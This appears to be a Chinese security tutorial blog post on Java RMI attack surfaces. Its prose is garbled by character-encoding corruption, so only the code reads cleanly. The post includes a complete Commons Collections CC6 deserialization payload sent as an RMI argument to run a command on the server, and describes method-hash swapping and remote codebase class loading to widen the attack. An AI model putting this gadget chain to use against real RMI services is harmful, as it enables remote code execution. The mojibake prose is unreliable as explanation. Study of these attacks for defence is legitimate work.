title="RMIåº•å±‚åŸç†æ€»ç»“"></a>RMIåº•å±‚åŸç†æ€»ç»“</h2><p>å¯¹äºæ›´åº•å±‚éƒ¨åˆ†çš„åˆ†ææˆ‘å°±ä¸çŒ®ä¸‘ï¼Œç½‘ä¸Šå¾ˆå¤šå¤§ç‰›éƒ½å†™å¾—å¾ˆé€å½»æ¸…æ™°ï¼Œè¿™é‡Œæˆ‘å°±åªå†™å†™RMI-Attackè¡Œä¸ºäº†ã€‚</p><p>åº•å±‚åŸç†å¯ä»¥æ€»ç»“ä¸ºï¼ˆå€Ÿç”¨su18ä½¬çš„å›¾å›¾ï¼‰ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/3.png" alt="3"></p><p>æ€»è€Œè¨€ä¹‹ï¼ŒRMI åº•å±‚é€šè®¯é‡‡ç”¨äº†Stub (è¿è¡Œåœ¨å®¢æˆ·ç«¯) å’Œ Skeleton (è¿è¡Œåœ¨æœåŠ¡ç«¯) æœºåˆ¶ï¼ŒRMI è°ƒç”¨è¿œç¨‹æ–¹æ³•çš„å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€RMI å®¢æˆ·ç«¯åœ¨è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ä¼šå…ˆåˆ›å»º Stub ( sun.rmi.registry.RegistryImpl_Stub )ã€‚<br><span class="hljs-number">2</span>ã€Stub ä¼šå°† Remote å¯¹è±¡ä¼ é€’ç»™è¿œç¨‹å¼•ç”¨å±‚ ( java.rmi.server.RemoteRef ) å¹¶åˆ›å»º java.rmi.server.RemoteCall( è¿œç¨‹è°ƒç”¨ )å¯¹è±¡ã€‚<br><span class="hljs-number">3</span>ã€RemoteCall åºåˆ—åŒ– RMI æœåŠ¡åç§°ã€Remote å¯¹è±¡ã€‚<br><span class="hljs-number">4</span>ã€RMI å®¢æˆ·ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ä¼ è¾“ RemoteCall åºåˆ—åŒ–åçš„è¯·æ±‚ä¿¡æ¯é€šè¿‡ Socket è¿æ¥çš„æ–¹å¼ä¼ è¾“åˆ° RMI æœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ã€‚<br><span class="hljs-number">5</span>ã€RMIæœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚( sun.rmi.server.UnicastServerRef )æ”¶åˆ°è¯·æ±‚ä¼šè¯·æ±‚ä¼ é€’ç»™ Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )ã€‚<br><span class="hljs-number">6</span>ã€Skeleton è°ƒç”¨ RemoteCall ååºåˆ—åŒ– RMI å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„åºåˆ—åŒ–ã€‚<br><span class="hljs-number">7</span>ã€Skeleton å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼šbindã€listã€lookupã€rebindã€unbindï¼Œå¦‚æœæ˜¯ lookup åˆ™æŸ¥æ‰¾ RMI æœåŠ¡åç»‘å®šçš„æ¥å£å¯¹è±¡ï¼Œåºåˆ—åŒ–è¯¥å¯¹è±¡å¹¶é€šè¿‡ RemoteCall ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">9</span>ã€RMI å®¢æˆ·ç«¯ååºåˆ—åŒ–æœåŠ¡ç«¯ç»“æœï¼Œè·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚<br><span class="hljs-number">10</span>ã€RMI å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼ŒRMIæœåŠ¡ç«¯åå°„è°ƒç”¨RMIæœåŠ¡å®ç°ç±»çš„å¯¹åº”æ–¹æ³•å¹¶åºåˆ—åŒ–æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">11</span>ã€RMI å®¢æˆ·ç«¯ååºåˆ—åŒ– RMI è¿œç¨‹æ–¹æ³•è°ƒç”¨ç»“æœã€‚<br></code></pre></td></tr></table></figure><h2 id="RMI-Attack"><a href="#RMI-Attack" class="headerlink" title="RMI-Attack"></a>RMI-Attack</h2><p>è¿™é‡Œæˆ‘è§‰å¾—su18ä½¬çš„ç”µè¯æœ¬æ¯”å–»å¾ˆæ°å½“ä¹Ÿå¾ˆæ˜“æ‡‚ï¼ŒJava RMI è®¾è®¡äº†ä¸€ä¸ª Registry çš„æ€æƒ³ï¼Œå¾ˆå¥½ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ³¨å†Œè¡¨æ¥æŸ¥æ‰¾ä¸€ä¸ªè¿œç«¯å¯¹è±¡çš„å¼•ç”¨ï¼Œæ›´é€šä¿—çš„æ¥è®²ï¼Œè¿™ä¸ªå°±æ˜¯ä¸€ä¸ª RMI ç”µè¯æœ¬ã€‚</p><p>æˆ‘ä»¬æƒ³åœ¨æŸä¸ªäººé‚£é‡Œè·å–ä¿¡æ¯æ—¶ï¼ˆRemote Method Invocationï¼‰ï¼Œæˆ‘ä»¬åœ¨ç”µè¯æœ¬ä¸Šï¼ˆRegistryï¼‰é€šè¿‡è¿™ä¸ªäººçš„åç§° ï¼ˆNameï¼‰æ¥æ‰¾åˆ°è¿™ä¸ªäººçš„ç”µè¯å·ç ï¼ˆReferenceï¼‰ï¼Œå¹¶é€šè¿‡è¿™ä¸ªå·ç æ‰¾åˆ°è¿™ä¸ªäººï¼ˆRemote Objectï¼‰ã€‚</p><p>å‚ä¸ä¸€æ¬¡ RMI è°ƒç”¨çš„æœ‰ä¸‰ä¸ªè§’è‰²ï¼Œåˆ†åˆ«æ˜¯ Server ç«¯ï¼ŒRegistry ç«¯å’Œ Client ç«¯ã€‚ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è®²ï¼Œåªæœ‰ Registry ç«¯å’Œä½¿ç”¨ Registry çš„ç«¯ï¼Œå› ä¸º Registry ç«¯åªè´Ÿè´£æŸ¥è¯¢å’Œä¼ é€’å¼•ç”¨ï¼ŒçœŸæ­£çš„æ–¹æ³•è°ƒç”¨æ˜¯ä¸éœ€è¦ç»è¿‡ Registry ç«¯çš„ï¼Œåªä¸è¿‡æ³¨å†ŒæœåŠ¡çš„æˆ‘ä»¬ç§°ä¹‹ä¸º Server ç«¯ï¼Œä½¿ç”¨æœåŠ¡çš„æˆ‘ä»¬ç§°ä¹‹ä¸º Client ç«¯ã€‚</p><p><strong>æœ‰ä¸€ç§æˆ‘åªè´Ÿè´£å¸®ä½ æ‰¾åˆ°äººï¼Œè‡³äºä½ æ‰¾è¿™ä¸ªäººåšä»€ä¹ˆéæ³•å‹¾å½“æˆ‘ä¸ç®¡çš„æ„Ÿè§‰</strong>ï¼Œä¸è¿‡ä¸ºäº†æ›´æ¸…æ™°çš„åˆ’åˆ†ä¸åŒè§’è‰²ï¼Œæˆ‘ä»¬è¿˜æ˜¯å°†å…¶åˆ†ä¸ºä¸‰ä¸ªè§’è‰²ï¼Œè€Œé€šå¸¸æƒ…å†µä¸‹ï¼ŒServer ç«¯å’Œ Registry ç«¯æ˜¯åŒä¸€ç«¯ã€‚</p><p>RMIè°ƒç”¨è¿‡ç¨‹å†³å®šäº†ä¸‰è€…éƒ½æ¶‰åŠååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥å¯¹è¿™ä¸‰è€…çš„æ”»å‡»å°±å‘¼ä¹‹æ¬²å‡ºã€‚</p><p>å¤§æ¦‚åˆ†è¿™å‡ ç§ï¼š</p><ol><li>æ”»å‡»å®¢æˆ·ç«¯<ul><li>RegistryImp_Stub#lookup ååºåˆ—åŒ–æ³¨å†Œä¸­å¿ƒè¿”å›çš„Stub</li><li>UnicastRef#invoke ååºåˆ—åŒ–è¿œè°ƒæ–¹æ³•çš„æ‰§è¡Œç»“æœ</li><li>StreamRemoteCall#executeCall ååºåˆ—åŒ–è¿œç¨‹è°ƒç”¨è¿”å›çš„å¼‚å¸¸ç±»</li><li>DGCImpl_Stub#dirty</li></ul></li><li>æ”»å‡»æœåŠ¡ç«¯<ul><li>UnicastServerRef#dispatch ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ é€’çš„æ–¹æ³•å‚æ•°</li><li>DGCImpl_Skel#dispatch</li></ul></li><li>æ”»å‡»æ³¨å†Œä¸­å¿ƒ<ul><li>RegistryImp_Stub#bind æ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–æœåŠ¡ç«¯ä¼ é€’ä¼ æ¥çš„è¿œç¨‹å¯¹è±¡</li></ul></li></ol><h3 id="Server-ç«¯-Attack"><a href="#Server-ç«¯-Attack" class="headerlink" title="Server ç«¯ Attack"></a>Server ç«¯ Attack</h3><h4 id="æ¶æ„æœåŠ¡å‚æ•°"><a href="#æ¶æ„æœåŠ¡å‚æ•°" class="headerlink" title="æ¶æ„æœåŠ¡å‚æ•°"></a>æ¶æ„æœåŠ¡å‚æ•°</h4><p>è¿™é‡Œéœ€è¦ä¸€ä¸ªèƒŒæ™¯ï¼Œå½“ Client ç«¯è·å–åˆ° Server ç«¯åˆ›å»ºçš„ Stub åï¼ŒClient ä¼šåœ¨æœ¬åœ°è°ƒç”¨è¿™ä¸ª Stub å¹¶ä¼ é€’å‚æ•°ï¼ŒStub ä¼šåºåˆ—åŒ–è¿™ä¸ªå‚æ•°å¹¶ä¼ é€’ç»™ Server ç«¯ï¼Œ<strong>Server ç«¯å°±ä¼šååºåˆ—åŒ– Client ç«¯ä¼ å…¥çš„å‚æ•°å¹¶è¿›è¡Œè°ƒç”¨</strong>ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°æ˜¯ <strong>Object ç±»å‹</strong>çš„æƒ…å†µä¸‹ï¼ŒClient ç«¯å¯ä»¥ä¼ ç»™ Server ç«¯<strong>ä»»æ„çš„ç±»</strong>ï¼Œç›´æ¥é€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p><p>ä¾‹å¦‚æˆ‘ä»¬ä¸Šé¢å†™çš„åœ¨è¿œç¨‹è°ƒç”¨æ¥å£ RemoteInterface å­˜åœ¨ä¸€ä¸ªä¼ å…¥Objectç±»å‹çš„<code>sayGoodbye</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£å°±ç›´æ¥å¯ä»¥ä¼ ä¸€ä¸ªååºåˆ—åŒ– payload è¿›å»æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">9999</span>);<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (Hello) r.lookup(<span class="hljs-string">&quot;hello&quot;</span>);<br>        stub.sayHello(getPayload());<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getPayload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-keyword">return</span> expMap;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>        String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>CC6ç›´æ¥å¼¹calcã€‚</p><p>å¦‚æœå‚æ•°ç±»å‹ä¸æ˜¯ Object ç±»å‹ï¼Œé‚£èƒ½å¦è¿›è¡Œæ”»å‡»ï¼Ÿ</p><p>å½“ç„¶å¯ä»¥ã€‚</p><p>è¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸ªå°å®éªŒï¼Œæˆ‘ä»¬åœ¨Serverçš„æ¥å£å¤„è‹¥ä½¿ç”¨<code>HelloObject</code>ä½œä¸ºå‡½æ•°å‚æ•°ï¼ŒClientçš„æ¥å£ä½¿ç”¨<code>Object</code>ä½œä¸ºå‡½æ•°å‚æ•°ï¼š</p><p>Serverï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HelloObject name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·è‹¥æƒ³ç›´æ¥è§¦å‘ååºåˆ—åŒ–æ´ä¼šæŠ¥é”™ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/4.png" alt="4"></p><p>å…¶å®å¯ä»¥çœ‹å‡ºï¼Œå°±æ˜¯åœ¨æœåŠ¡ç«¯æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„è°ƒç”¨æ–¹æ³•ã€‚å¯ä»¥å‘ç°è¿™ä¸ªè°ƒç”¨æ–¹æ³•åœ¨ UnicastServerRef çš„ <code>dispatch</code> æ–¹æ³•ä¸­åœ¨ <code>this.hashToMethod_Map</code> ä¸­é€šè¿‡ Method çš„ hash æ¥æŸ¥æ‰¾ã€‚</p><p>è¿™ä¸ª hash å®é™…ä¸Šæ˜¯ä¸€ä¸ªåŸºäºæ–¹æ³•ç­¾åçš„ SHA1 hash å€¼ã€‚</p><p>é‚£æœ‰æ²¡æœ‰ä¸€ç§å¯èƒ½ï¼Œ<strong>æˆ‘ä»¬ä¼ é€’çš„æ˜¯ Server ç«¯èƒ½æ‰¾åˆ°çš„å‚æ•°æ˜¯ HelloObject çš„ Method çš„ hashï¼Œä½†æ˜¯ä¼ é€’çš„å‚æ•°å´ä¸æ˜¯ HelloObject è€Œæ˜¯æ¶æ„çš„ååºåˆ—åŒ–æ•°æ®ï¼ˆå¯èƒ½æ˜¯ Objectæˆ–å…¶ä»–çš„ç±»ï¼‰å‘¢ï¼Ÿ</strong></p><p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼Œåœ¨ mogwailabs çš„ [PPT](<a href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides">https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides</a> Exploiting RMI Services.pdf) ä¸­æå‡ºäº†ä»¥ä¸‹ 4 ç§æ–¹æ³•ï¼š</p><ul><li>é€šè¿‡ç½‘ç»œä»£ç†ï¼Œåœ¨æµé‡å±‚ä¿®æ”¹æ•°æ®</li><li>è‡ªå®šä¹‰ â€œjava.rmiâ€ åŒ…çš„ä»£ç ï¼Œè‡ªè¡Œå®ç°</li><li>å­—èŠ‚ç ä¿®æ”¹</li><li>ä½¿ç”¨ debugger</li></ul><p>å¹¶ä¸”åœ¨ PPT ä¸­è¿˜ç»™å‡ºäº† hook ç‚¹ï¼Œé‚£å°±æ˜¯åŠ¨æ€ä»£ç†ä¸­ä½¿ç”¨çš„ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•ã€‚</p><p>å®¢æˆ·ç«¯çš„æ¥å£ä¹Ÿæ·»åŠ ä¸€ä¸ªåŒæœåŠ¡ç«¯ç›¸åŒçš„æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object s)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>    String <span class="hljs-title function_">sayGoodBye</span><span class="hljs-params">(HelloObject o)</span> <span class="hljs-keyword">throws</span> RemoteException;  <span class="hljs-comment">//Same as Server&#x27;s</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å³è°ƒè¯•ä¸‹æ–­ç‚¹çš„æ—¶å€™ï¼Œåœ¨<code>RemoteObjectInvocationHandler</code>è°ƒç”¨<code>invokeRemoteMethod</code>çš„æ—¶å€™ä¿®æ”¹methodï¼ˆåœ¨ RemoteObjectInvocationHandler çš„ <code>invokeRemoteMethod</code> æ–¹æ³•å¤„ä¸‹æ–­ï¼Œå°† Method æ”¹ä¸ºæœåŠ¡ç«¯å­˜åœ¨çš„ HelloObject çš„ Methodï¼‰ï¼Œä¸‹é¢<code>getMethodHash(method)</code>è·å–åˆ°çš„å“ˆå¸Œå°±å’ŒæœåŠ¡ç«¯çš„ä¸€æ ·äº†ï¼Œåç»­å¼¹calcéƒ½ä¸€æ ·çš„ã€‚</p><p><img src="/2024/07/18/RMI-JNDI/5.png" alt="5"></p><p>Afant1 å¸ˆå‚…ä½¿ç”¨äº† Java Agent çš„æ–¹å¼æ’æ¡©ï¼Œåœ¨<a href="https://www.anquanke.com/post/id/200860">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œ0c0c0f å¸ˆå‚…ä½¿ç”¨äº†æµé‡å±‚çš„æ›¿æ¢ï¼Œåœ¨<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg">è¿™ç¯‡æ–‡ç« </a>é‡Œï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…è¯·è‡ªè¡ŒæŸ¥çœ‹ã€‚</p><p>åˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œå°±å¤§å¤§çš„æ‰©å±•äº†åˆ©ç”¨é“¾ã€‚RMI çš„ååºåˆ—åŒ–é€»è¾‘ä½äº <code>sun.rmi.server.UnicastRef#unmarshalValue</code>ï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/6.png" alt="6"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œé™¤äº†åŸºç¡€æ•°æ®ç±»å‹ï¼Œå…¶ä»–çš„ç±»å‹å‡èƒ½è°ƒç”¨ readObject è¿›è¡Œååºåˆ—åŒ–ï¼Œç”šè‡³åŸæœ¬ String ç±»å‹çš„å‚æ•°ä¹Ÿä¼šèµ° readObject ååºåˆ—åŒ–ï¼Œé‚£ä¹ˆç»“åˆä¹‹å‰çš„æ›¿æ¢æ‰‹æ®µï¼Œæ€»ç»“èµ·æ¥å°±æ˜¯ï¼š</p><blockquote><p><strong>Server ç«¯çš„è°ƒç”¨æ–¹æ³•å­˜åœ¨éåŸºç¡€ç±»å‹çš„å‚æ•°æ—¶ï¼Œå°±å¯ä»¥è¢«æ¶æ„ Client ç«¯ä¼ å…¥æ¶æ„æ•°æ®æµè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</strong></p></blockquote><h4 id="åŠ¨æ€ç±»åŠ è½½"><a href="#åŠ¨æ€ç±»åŠ è½½" class="headerlink" title="åŠ¨æ€ç±»åŠ è½½"></a>åŠ¨æ€ç±»åŠ è½½</h4><p>ä¸Šé¢è¯´è¿‡ï¼ŒRMIååºåˆ—åŒ–å‚æ•°çš„æ—¶å€™ï¼Œè‹¥åœ¨æœ¬åœ°æ‰¾ä¸åˆ°ç±»ï¼Œä¼šåœ¨æŒ‡å®šçš„codebaseä¸‹åŠ è½½ç±»ï¼Œè€Œcodebaseå¯ä»¥ç”±å®¢æˆ·ç«¯æŒ‡å®šï¼Œé‚£ä¹ˆè¿™å°±æ˜¯ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„æ‰“ååºåˆ—åŒ–çš„åœ°æ–¹ã€‚è¿™ä¸ªç‰¹æ€§åœ¨ 6u45&#x2F;7u21 ä¹‹å‰éƒ½æ˜¯é»˜è®¤å¼€å¯çš„ã€‚</p><p>ä¸ºäº†èƒ½å¤Ÿè¿œç¨‹åŠ è½½ç›®æ ‡ç±»ï¼Œéœ€è¦ Server åŠ è½½å¹¶é…ç½® SecurityManagerï¼Œå¹¶è®¾ç½® <code>java.rmi.server.useCodebaseOnly=false</code>ã€‚</p><p>Server ç«¯è°ƒç”¨ UnicastServerRef çš„ <code>dispatch</code> æ–¹æ³•å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼Œè°ƒç”¨ <code>unmarshalParameters</code> æ–¹æ³•ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ æ¥çš„å‚æ•°ã€‚</p><p>ååºåˆ—åŒ–è¿‡ç¨‹ç”± RMI å°è£…ç±» MarshalInputStream æ¥å®ç°ï¼Œä¼šè°ƒç”¨ <code>resolveClass</code> æ¥è§£æ Classã€‚</p><p>æ— è®º Server ç«¯è¿˜æ˜¯ Client ç«¯ï¼Œåªè¦æœ‰ä¸€ç«¯é…ç½®äº† <code>java.rmi.server.codebase</code>ï¼Œè¿™ä¸ªå±æ€§éƒ½ä¼šè·Ÿéšæ•°æ®æµåœ¨ä¸¤ç«¯æµåŠ¨ã€‚</p><p><strong>å› æ­¤ï¼ŒClient ç«¯å¯ä»¥é€šè¿‡é…ç½®æ­¤é¡¹å±æ€§ï¼Œå¹¶å‘ Server ç«¯ä¼ é€’ä¸å­˜åœ¨çš„ç±»ï¼Œä½¿ Server ç«¯è¯•å›¾ä» <code>java.rmi.server.codebase</code> åœ°å€ä¸­è¿œç¨‹åŠ è½½æ¶æ„ç±»è€Œè§¦å‘æ”»å‡»ã€‚</strong></p><h4 id="æ›¿èº«æ”»å‡»"><a href="#æ›¿èº«æ”»å‡»" class="headerlink" title="æ›¿èº«æ”»å‡»"></a>æ›¿èº«æ”»å‡»</h4><p>åœ¨è®¨è®ºå¯¹ Server 